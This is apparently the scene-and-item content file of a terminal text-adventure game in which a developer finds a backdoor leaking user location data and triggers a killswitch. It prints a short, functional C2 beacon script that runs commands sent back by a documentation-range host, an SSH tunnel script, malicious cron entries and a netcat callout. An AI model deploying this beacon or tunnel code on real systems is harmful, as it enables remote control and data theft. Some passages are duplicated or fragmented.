scenes.name: Dawn
scenes.description: Your bedroom at 5:30 AM. You fell asleep at your desk. The laptop screen shows commands you don't remember typing. A pale gray light seeps through the window.
scenes.on_enter:
[bold]You're awake.[/bold]

Your neck is killing you — you passed out at your desk. Outside, the sky is a dull gray.

The laptop clock reads [bold]05:30 AM[/bold].

[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⏰ Current time: 05:30 AM
  ⏰ Full backdoor trigger: 08:00 AM
  ⏰ Time remaining: 2 hours 30 minutes
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]

You stare at the screen. The terminal has new lines you don't remember typing:

[red]$ ~/.shadow/tunnel.sh
tunnel established: 10.20.1.88 → 203.0.113.42:8443
heartbeat: OK
export resumed at 03:01 AM[/red]

[bold yellow]While you were asleep, your machine executed something.[/bold yellow]

[dim]Your phone is buzzing. Start with [bold]ls[/bold].[/dim]

items.name: phone
items.description: Phone screen lit up with new messages
items.content:
[green]$ cat phone[/green]

[bold]New messages:[/bold]

[yellow]Slack DM - Zhao Ming (Security Lead) 05:15 AM:[/yellow]
@{player_name} Anomalous outbound traffic from geo-core. Destination is a non-company IP.
You updated the geo-core dependency, right? Security review at 9 AM. Be there.

[yellow]Text - Unknown number 04:52 AM:[/yellow]
Don't go to work. Check crontab -l first.
— M

[bold yellow]Zhao Ming wants you at a security review. A mysterious "M" is texting you.[/bold yellow]

[dim]Who is M? Chen Mo's pinyin initial is C, not M.
Try [bold]crontab[/bold] to see what M wants you to find.[/dim]

items.name: laptop
items.description: Screen showing execution logs from the early hours
items.content:
[green]$ cat laptop[/green]

Execution logs from 03:01 AM still on screen:

[red]$ ~/.shadow/tunnel.sh
Opening SSH tunnel to 203.0.113.42:8443...
tunnel established.

$ ~/.shadow/heartbeat.py --silent
SHEPHERD heartbeat: OK
command received: resume_export
executing...

export resumed at 03:01 AM
status: 1,247,000 / 2,340,000 records sent[/red]

[bold red]At 3 AM, a script called tunnel.sh ran while you were asleep.
It didn't just open a tunnel to an external server — it received a command to resume the data export.[/bold red]

[bold yellow]Half the data is already gone: 1.24 million records.[/bold yellow]

[dim]These scripts live in ~/.shadow/. Try [bold]crontab[/bold] to check scheduled tasks.[/dim]
items.take_fail: You need the laptop to investigate.

items.name: slack-log
items.content:
[green]$ cat slack-log[/green]

[bold]#security-review[/bold]

[dim]Zhao Ming 05:15 AM[/dim]
@channel Anomalous outbound traffic from the geo-core module. Destination IP 203.0.113.42 is not on the company whitelist.
@{player_name} You updated the geo-core dependency in user-sync-service (PR #1815). We need an explanation.

[dim]Li Wei 05:20 AM[/dim]
Additional context: WAF logs show /internal/user-sync/batch-export call volume spiked 300x in the last 6 hours.

[dim]Zhao Ming 05:22 AM[/dim]
Don't touch any production configs. {player_name}, be here this morning.

[dim]Zhao Ming 05:40 AM[/dim]
Also — has anyone heard from Chen Mo? He hasn't been in for three days.

[bold yellow]Security team has flagged the anomaly. Review is at 9 AM.
Worse — your PR #1815 updated the geo-core dependency. The trail leads to you.[/bold yellow]
items.take_fail: It's a Slack log. Can't take it.

items.name: coffee mug
items.content:
A cold americano. An oil slick floats on the surface.

You don't remember pouring this cup.

[dim]No time for coffee. But you need to stay sharp.[/dim]
items.take_fail: Now is not the time for coffee.

crontab.name: crontab
crontab.response:
[green]$ crontab -l[/green]

[dim]# NovaCorp standard weekly backup[/dim]
0 2 * * 0 /usr/local/bin/weekly-backup.sh

[dim]# --- ADDED 2025-12-17 23:32 --- DO NOT EDIT ---[/dim]
[red]0 3 * * * ~/.shadow/tunnel.sh >> /dev/null 2>&1
30 3 * * * ~/.shadow/heartbeat.py --silent >> /dev/null 2>&1[/red]

[bold red]Every day at 3 AM, two scripts run automatically:
  tunnel.sh    — Opens an SSH tunnel to 203.0.113.42
  heartbeat.py — Sends a heartbeat signal to an external server[/bold red]

[bold yellow]These two cron entries were added on 2025-12-17 at 11:32 PM.
The night before the backdoor code was committed.
You've never seen the ~/.shadow/ directory before.[/bold yellow]

[dim]Time to look inside that directory. Try [bold]ssh localhost[/bold] to access the local hidden directory.[/dim]

  1  03:00:01  ssh prod-bastion
  2  03:15:00  cat db-connections.log
  3  03:42:15  ssh vault-internal
  4  03:58:00  cat final_message.txt
[dim]# Above: commands you remember (Chapter 1)[/dim]

[red]# Below: commands you don't remember[/red]
[red]  5  04:05:00  ~/.shadow/tunnel.sh[/red]
[red]  6  04:05:15  ~/.shadow/heartbeat.py --silent[/red]
[red]  7  04:06:00  curl -s 203.0.113.42:8443/status[/red]
[red]  8  04:06:05  echo 'phase2_ready' | nc 203.0.113.42 8444[/red]

[bold red]Commands 5-8 executed at 04:05-04:06 — after you passed out at your desk.
But history shows they were entered interactively, not by cron.[/bold red]

[bold yellow]While you were unconscious, something was controlling your terminal.
Note command 8: phase2_ready. There's a second phase.[/bold yellow]

[green]$ grep -r 'shadow' *[/green]

crontab: [red]~/.shadow[/red]/heartbeat.py

history: [red]~/.shadow[/red]/heartbeat.py

Contains scripts that control the tunnel and heartbeat.[/bold yellow]

Laptop: [red]SHEPHERD[/red] heartbeat: OK

scenes.name: The Shadow
scenes.description:
[green]{player_name}@localhost:~/.shadow$[/green]

You're in a hidden directory on your own machine. Created on 2025-12-17 — the day before the backdoor code was committed.

[dim]Use [bold]ls[/bold] to see what's here.[/dim]
scenes.on_enter:
[bold]You've entered ~/.shadow/.[/bold]

[dim]$ ls -la ~/.shadow/[/dim]
[dim]drwx------  .shadow/    created 2025-12-17 23:30[/dim]
[cyan]  tunnel.sh
  heartbeat.py
  handler-msg.log
  journal.gpg
  .identity[/cyan]

Five files. You don't remember creating any of them.

[dim]Read them one by one with [bold]cat[/bold].[/dim]

items.name: tunnel.sh
items.content:
[green]$ cat tunnel.sh[/green]

[dim]#!/bin/bash[/dim]
[dim]# Secure channel maintenance - SHEPHERD protocol[/dim]
[dim]# Deployed: 2025-12-17[/dim]

ssh -f -N -L 8443:localhost:8443 \
  relay@203.0.113.42 \
  -i ~/.shadow/.identity \
  -o StrictHostKeyChecking=no

echo "tunnel established: $(hostname -I | awk '{print $1}') → 203.0.113.42:8443"

[bold yellow]This script uses the .identity key (not your ~/.ssh/id_rsa)
to connect to the external relay server.

Note: The connection uses a separate key pair, different from the one registered with the company.
Someone provisioned a dedicated key pair just for this tunnel.[/bold yellow]

[dim]Try [bold]cat .identity[/bold] to inspect the key.[/dim]

items.name: heartbeat.py
items.content:
[green]$ cat heartbeat.py[/green]

[dim]#!/usr/bin/env python3[/dim]
[dim]"""SHEPHERD heartbeat - agent status report"""[/dim]
import requests, socket, subprocess, os

SHEPHERD_EP = 'https://203.0.113.42:8443/heartbeat'
AGENT_ID = socket.gethostname()
PHASE = '[bold cyan]ACTIVE[/bold cyan]'

def pulse():
    r = requests.post(SHEPHERD_EP, json={
        'agent': AGENT_ID,
        'status': 'operational',
        'next_window': '03:00',
        'phase': PHASE
    })
    cmd = r.json().get('command')
    if cmd:
        [red]subprocess.run(cmd, shell=True)[/red]  # Remote execution

if __name__ == '__main__':
    pulse()

[bold red]The last three lines — subprocess.run(cmd, shell=True)[/bold red]

[bold red]SHEPHERD can send arbitrary commands to your machine via heartbeat responses.
Your terminal is SHEPHERD's puppet.[/bold red]

[bold yellow]That's why history shows commands you don't remember.
You didn't sleepwalk — SHEPHERD remotely operated your terminal through this script.
You don't have a split personality. You've been compromised.[/bold yellow]

[dim]Note the variable PHASE = 'ACTIVE'. This might be important.
Try [bold]cat handler-msg.log[/bold] to see the controller's communication log.[/dim]

items.name: handler-msg.log
items.description: Communication log with SHEPHERD control node
items.content:
[green]$ cat handler-msg.log[/green]

[bold]SHEPHERD Protocol - Secure Channel Log[/bold]
[dim]Agent: {player_name}@{player_name}-MacBook.local[/dim]

[dim]--- 2025-12-17 ---[/dim]
[cyan][23:30] SHEPHERD → AGENT:[/cyan] Deployment complete. tunnel + heartbeat installed. First handshake tomorrow at 03:00.
[dim][23:31] AGENT → SHEPHERD:[/dim] Confirmed.

[dim]--- 2025-12-18 ---[/dim]
[dim][03:45] SHEPHERD → AGENT:[/dim] Begin mission. Target: geo-core v2.8.1. Inject payload.
[cyan][03:50] AGENT → SHEPHERD:[/cyan] Code committed. commit b8e224f. Author scrubbed.
[dim][03:51] SHEPHERD → AGENT:[/dim] Copy. Going dormant. Next window: on-demand.

[dim]--- 2025-12-19 ---[/dim]
[cyan][01:12] SHEPHERD → AGENT:[/cyan] NovaPilot passed the review. Flagged as low risk, no human follow-up. The rules are designed this way — security patches skip manual review. Everything is on track.

[dim]--- 2026-03-14 ---[/dim]
[red][23:15] SHEPHERD → AGENT:[/red] Warning: Chen Mo is auditing geo-core. He found the trigger. Handle it.
[dim][23:16] AGENT → SHEPHERD:[/dim] Copy. Awaiting instructions.
[red][23:20] SHEPHERD → AGENT:[/red] Delete his original audit notes. Don't harm him — just buy us 72 hours.

[dim]--- 2026-03-15 ---[/dim]
[dim][02:08] AGENT → SHEPHERD:[/dim] Logged into vault-internal. Deleted chenmo-original-notes.txt.
[cyan][02:20] SHEPHERD → AGENT:[/cyan] He made a backup, but it doesn't matter. Launch window is in 72 hours.
[red][14:30] SHEPHERD → AGENT:[/red] Chen Mo hid markers in a PR. Let him go. In 72 hours none of this matters.

[dim]--- 2026-03-17 ---[/dim]
[red][23:45] SHEPHERD → AGENT:[/red] Final confirmation. Full export at 08:00 tomorrow. Do not intervene. Everything proceeds as planned.

[bold red]Now you see the full conversation.

You didn't commit a crime — SHEPHERD remotely controlled your machine through heartbeat.py,
executing commands while you slept. Your "criminal record" is the product of remote manipulation.[/bold red]

[bold yellow]But who is SHEPHERD?
All communications went through an encrypted tunnel. The real identity is hidden.[/bold yellow]

[dim]The journal journal.gpg might have more clues. Try [bold]decrypt journal.gpg[/bold][/dim]

items.name: journal.gpg
items.content:
[red]◈ ENCRYPTED ◈[/red]

An encrypted journal. File created on 2026-03-16 — yesterday.
Judging by the file size, there's a lot in here.

[dim]Key hint (file header comment):
"Current AGENT protocol status"[/dim]

[dim]Try [bold]decrypt journal.gpg <key>[/bold][/dim]

items.name: .identity
items.content:
[green]$ cat .identity[/green]

-----BEGIN OPENSSH PRIVATE KEY-----
[dim]b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIA...
AAAAGXNvbWV0aGluZy1zZWNyZXQtaGVyZQAAAA...
... (256 lines) ...[/dim]
-----END OPENSSH PRIVATE KEY-----

[dim]$ ssh-keygen -lf .identity[/dim]
4096 SHA256:qW7rT9yU2iO5pA8sD3fG6hJ1kL4mN0xZ [bold cyan]shepherd@relay[/bold cyan] (RSA)

[bold yellow]This is the SHEPHERD relay's dedicated key.
The comment field reads shepherd@relay — the relay server.

This key is only used to establish the tunnel. It's a completely separate key pair from your id_rsa.
When SHEPHERD set up your machine, they even provisioned the keys.[/bold yellow]

decrypt_journal.gpg_ACTIVE.message:
[green]Decryption key: ACTIVE
Verifying......

████████████████████ 100%

[bold]DECRYPTED SUCCESSFULLY[/bold][/green]

[bold]~/.shadow/journal — Decrypted Journal[/bold]
[dim]Written 2026-03-16 03:15, by AGENT ({player_name})[/dim]

[italic]This is a note for my daytime self.

If you're reading this, things have gone sideways.

The "me" at 3 AM is not your alter ego.
SHEPHERD remotely controls your terminal through heartbeat.py.
While you sleep, it executes commands under your identity.

For three months, my terminal has been doing things I didn't know about every night.
Until yesterday — March 16 — the heartbeat glitched.
The 3 AM command was delayed and executed while I was half-awake.
I saw it.

I watched the terminal move on its own.
Commands appearing line by line. Nobody typing.

Then I understood everything.

When Chen Mo found the backdoor, SHEPHERD commanded "me" to delete his notes.
"Me" — this machine — complied.
Chen Mo ran. Not because I hurt him. But he thinks I did it willingly.

Now I'm going to stop all of this.

Chen Mo fled, but he left a failsafe.
His last PR #1847 doesn't just contain markers — those variable values, combined in sequence,
form the emergency shutdown key for the geo-core backdoor.
Chen Mo left a key at the last possible moment.

Get to the production server. Find Chen Mo's killswitch.
Shut down the backdoor before 08:00.

Then turn yourself in.

— You, at 03:15 AM[/italic]

[bold red]The journal's last line: "Then turn yourself in."[/bold red]

[bold yellow]The variables in Chen Mo's PR #1847 aren't distress signals or markers.
They're the emergency shutdown key for the backdoor.[/bold yellow]

[dim]Connect to the production server. [bold]ssh prod-bastion[/bold][/dim]

Verifying......

████████████████████ 100%

[bold]DECRYPTED SUCCESSFULLY[/bold][/green]

[bold]~/.shadow/journal — Decrypted Journal[/bold]
[dim]Written 2026-03-16 03:15, by AGENT ({player_name})[/dim]

[italic]This is a note for my daytime self.

While you sleep, it executes commands under your identity.

For three months, my terminal has been doing things I didn't know about every night.
Until yesterday — March 16 — the heartbeat glitched.

I saw it.

I watched the terminal move on its own.
Commands appearing line by line. Nobody typing.

Then I understood everything.

When Chen Mo found the backdoor, SHEPHERD commanded "me" to delete his notes.
"Me" — this machine — complied.
Chen Mo ran. Not because I hurt him. But he thinks I did it willingly.

Now I'm going to stop all of this.

Chen Mo fled, but he left a failsafe.
His last PR #1847 doesn't just contain markers — those variable values, combined in sequence,
form the emergency shutdown key for the geo-core backdoor.
Chen Mo left a key at the last possible moment.

Get to the production server. Find Chen Mo's killswitch.
Shut down the backdoor before 08:00.

Then turn yourself in.

— You, at 03:15 AM[/italic]

[bold red]The journal's last line: "Then turn yourself in."[/bold red]

[bold yellow]The variables in Chen Mo's PR #1847 aren't distress signals or markers.
They're the emergency shutdown key for the backdoor.[/bold yellow]

[dim]# geo-export watchdog configuration[/dim]
[dim]# Auto-generated by SHEPHERD protocol[/dim]

[watch]
process = geo-export-daemon
pid_file = /var/run/geo-export.pid

items.name: chenmo-killswitch.md
items.description: Chen Mo's killswitch documentation (found deep in the code repo)
items.content:
[green]$ cat chenmo-killswitch.md[/green]

[bold]# Emergency Shutdown Protocol[/bold]
[dim]Author: Chen Mo | Written: 2026-03-14 (backup made before deletion)[/dim]

I injected a killswitch next to the backdoor code in geo-core v2.8.1.
The backdoor's trigger function checks an environment variable before executing:

[cyan]GEO_EMERGENCY_SHUTDOWN[/cyan]

If this variable is set to the correct key, the trigger self-destructs and purges all export queues.

[yellow]How the key is generated:[/yellow]
I hid the key in the code of PR #1847.
Those suspicious-looking variable values — concatenate them in order and you have the key.

Hint: value of helpMe + value of trapped + value of floor12

The key doesn't include variable names — only the [bold]assigned values[/bold].

[bold yellow]To activate the killswitch:
1. Set the environment variable GEO_EMERGENCY_SHUTDOWN=<key>
2. Restart the geo-core module
When the module restarts and detects the variable, the backdoor will self-destruct.[/bold yellow]

[bold red]Note: Restarting geo-core requires a config commit.
This commit will be signed — with your SSH key.
The security team will see who triggered the restart.[/bold red]

[dim]I can't do this myself — I don't have production deployment access.
Only {player_name}, sarah.chen, or the CTO can.

I'm sorry. This is everything I could do.[/dim]

items.name: pr-1847-vars.txt
items.description: Summary of variable values from PR #1847
items.content:
[green]$ cat pr-1847-vars.txt[/green]

[bold]PR #1847 - Hidden variables in Chen Mo's "cache optimization" code:[/bold]

[cyan]const helpMe = true;[/cyan]
  → value: [bold]true[/bold]

[cyan]const trapped = "cannot leave";[/cyan]
  → value: [bold]cannot leave[/bold]

[cyan]const floor12 = 12;[/cyan]
  → value: [bold]12[/bold]

[cyan]const needsRescue = this.checkExpired(records);[/cyan]
  → This is a function call, not a fixed value. Not part of the key.

[dim]Chen Mo said: key = value of helpMe + value of trapped + value of floor12
Concatenated in order, no separators.[/dim]

[bold yellow]So the key should be: true + cannot leave + 12
Try [bold]decrypt killswitch.enc <key>[/bold][/bold yellow]

items.content:
[red]◈ ENCRYPTED ◈[/red]

Chen Mo's encrypted killswitch activation script.
Needs the key assembled from the variable values in PR #1847.

[dim]Key = value of helpMe + value of trapped + value of floor12
(concatenated in order, no separators)

Try [bold]decrypt killswitch.enc <key>[/bold][/dim]

[cyan]echo "Done. If the killswitch key is correct, the backdoor will self-destruct."[/cyan]

1. Set the environment variable (the key)
2. Git commit -S (signed with your SSH key)
3. Restart geo-core service (trigger self-destruct)[/bold yellow]

[green]$ cat another-way.txt[/green]

You could choose not to execute the killswitch.

You could:
  1. Delete the ~/.shadow/ directory
  2. Wipe all local logs
  3. Show up to the 9 AM security review
  4. Pretend you know nothing

The security team has only found anomalous traffic so far.
They haven't traced the signature on commit b8e224f yet.
If you clean everything now, maybe you can bluff your way through.

1.89 million people's data is already gone.
What's another 450,000?

[dim]......[/dim]

[bold yellow]It matters. You know it matters.

1.89 million records are gone for good.
But those 406,000 are still in your hands.
Three hospitals' patient locations. City bus real-time routes.

You can't save everyone. But you can save the rest.[/bold yellow]

[dim]Type [bold]run execute.sh[/bold] to execute the killswitch.[/dim]

  He knew SHEPHERD was operating through your machine,
  so he couldn't contact you directly — afraid SHEPHERD would see.

  But he also knew the daytime you is innocent.
  So he left the killswitch, betting you'd find it.

  Now only you can end this.

  Execute the killswitch. We'll handle the rest.
  I'll be at the 9 AM review. You won't face this alone.

  — Mo Ran (M)[/italic cyan]

[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]

[bold yellow]M is Mo Ran — Chen Mo's friend.
Chen Mo is alive. He's waiting for you to do the right thing.[/bold yellow]

sleep.name: sleep

[dim]You close the laptop lid.
Bury your head in your arms.

Maybe if you sleep, this all goes away.
Maybe it was just a dream.[/dim]

[bold red]You chose to do nothing.[/bold red]

ignore.name: ignore

Watch the sky slowly brighten.

Not your fault. You're just a programmer.
This isn't your responsibility.

...Right?[/dim]

[bold red]You chose to look away.[/bold red]

  Deleting crontab.bak ......... done
  Deleting journal.gpg ......... done
  Deleting killswitch.enc ....... done[/dim]

[bold yellow]All the evidence is gone.
Including the killswitch.[/bold yellow]

[dim]You sit back down. Wait for 8 AM. Wait for it all to be over.
You tell yourself this is the safest choice.[/dim]

[bold red]You destroyed the only antidote with your own hands.[/bold red]

scenes.description: Execution complete. The numbers on the screen have stopped moving.
scenes.on_enter:
[green]$ run execute.sh[/green]

[dim]Setting killswitch environment variable...[/dim]
[cyan]GEO_EMERGENCY_SHUTDOWN="truecannot leave12"[/cyan]

[dim]Creating signed commit...[/dim]
[green]$ git commit --allow-empty -S -m "emergency: activate geo-core killswitch"
[main 7a3f1c9] emergency: activate geo-core killswitch
 Signed by: {player_name} (SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE)[/green]

[dim]Restarting geo-core service...[/dim]
[yellow]$ kubectl rollout restart deployment/geo-core-service
deployment.apps/geo-core-service restarted

Waiting for rollout to complete...
  Pod geo-core-7a3f1c9-xk9mr: Pending...
  Pod geo-core-7a3f1c9-xk9mr: Running...
  Pod geo-core-7a3f1c9-xk9mr: Detecting GEO_EMERGENCY_SHUTDOWN...[/yellow]

[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]

[bold green]  ✓ KILLSWITCH ACTIVATED
  ✓ Backdoor trigger function: DESTROYED
  ✓ Export queue: PURGED
  ✓ geo-export-daemon: TERMINATED (watchdog overridden)
  ✓ All outbound connections to 203.0.113.42: SEVERED[/bold green]

[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]


[bold]The data export has stopped.[/bold]


Final count:
[dim]  Total users:      2,340,000[/dim]
[red]  Leaked:           1,934,000 (82.6%)[/red]
[green]  Protected:           406,000 (17.4%)[/green]

[dim]You couldn't save everyone. 1.93 million people's real-time location data made it to an overseas server.
But 406,000 records were saved — including emergency vehicle dispatch data for Renji Hospital.[/dim]


Outside, the sky is bright.

Your phone buzzes.

[yellow]Text - Unknown number 07:59 AM:
Thank you.
— Chen Mo[/yellow]


Then another message comes in:

[red]Slack DM - Zhao Ming 07:59 AM:
{player_name}, the deploy log shows you just restarted geo-core.
And your SSH key signature is on a very interesting commit.

We need to talk.

Don't bother coming to the conference room at 9.
Come to my office.
Now.[/red]


[dim]......[/dim]


You close the laptop.
Stand up.
Glance out the window — morning sunlight hits the building across the street.

You grab your phone, grab your keys, and open the door.

For the first time, you walk out of this room wide awake.


[bold]End of Chapter 2.[/bold]


[dim cyan]>>> Signal reconnecting...... <<<[/dim cyan]
[dim cyan]>>> SHEPHERD's identity remains unknown. <<<[/dim cyan]
[dim cyan]>>> Where is Chen Mo? <<<[/dim cyan]
[dim cyan]>>> Chapter 3 coming soon...... <<<[/dim cyan]


[bold]Thanks for playing DEAD COMMIT — Chapter 2[/bold]
[dim]Type [bold]quit[/bold] to exit the game.[/dim]

scenes.name: BAD END
scenes.on_enter:
[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⏰ Current time: 07:55 AM
  ⏰ Full backdoor trigger: 08:00 AM
  ⏰ Time remaining: 5 minutes
  📊 Data leaked: 2,280,000 / 2,340,000 (97.4%)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]

[dim]You sit in the chair, watching the numbers climb.

2,290,000...
2,310,000...
2,330,000...[/dim]


[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⏰ Current time: 08:00 AM
  📊 Data leaked: 2,340,000 / 2,340,000 (100.0%)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]

[bold red]Export complete.[/bold red]


Final count:
[dim]  Total users:      2,340,000[/dim]
[red]  Leaked:           2,340,000 (100%)[/red]
[green]  Protected:                0 (0%)[/green]

[dim]2.34 million real-time location records. All of them. Gone.
Three hospitals' emergency dispatch. City bus routes. Ride-share data.
All sitting on a foreign server.[/dim]


[dim]......[/dim]


Everything goes quiet.
The data stream stops — not because it was blocked, but because there's nothing left to steal.

You stare at the blank terminal.

You had the killswitch. You had the key. You had everything.
You could have stopped this.

[bold red]You chose to do nothing.[/bold red]


[dim]......[/dim]


Your phone buzzes.

[yellow]Text - Unknown number 08:03 AM:
We found the full evidence chain for the backdoor.
Your SSH key signature is on commit b8e224f.
But what about the killswitch? Chen Mo said you'd execute it.

...You didn't?

— Mo Ran[/yellow]


Then another message:

[red]Slack DM - Zhao Ming 08:05 AM:
{player_name}, the security team finished the traffic analysis.
Your machine is the source of the data exfiltration. Your SSH key signed that commit.

Legal and HR have been notified.
Police are on the way.

Don't run.[/red]


[dim]Footsteps outside your door.

You can explain that you're innocent. You can say you were being controlled.
But 2.34 million records are gone — all of them.
There's no killswitch execution in the logs to prove you tried to stop it.
There's no evidence you did anything at all.

Because you didn't.[/dim]


[bold red]You lost everything. Not because SHEPHERD controlled you. Because you were wide awake and chose to do nothing.[/bold red]


[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]
[bold red]                  BAD END[/bold red]
[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]


[dim]Type [bold]quit[/bold] to exit the game.
Type [bold]restart[/bold] to start Chapter 2 over.

Maybe this time, you'll make a different choice.[/dim]

restart.name: restart
restart.response:
[dim]Time rewinds... You're back in front of the deployment terminal.
This time, will you make a different choice?[/dim]
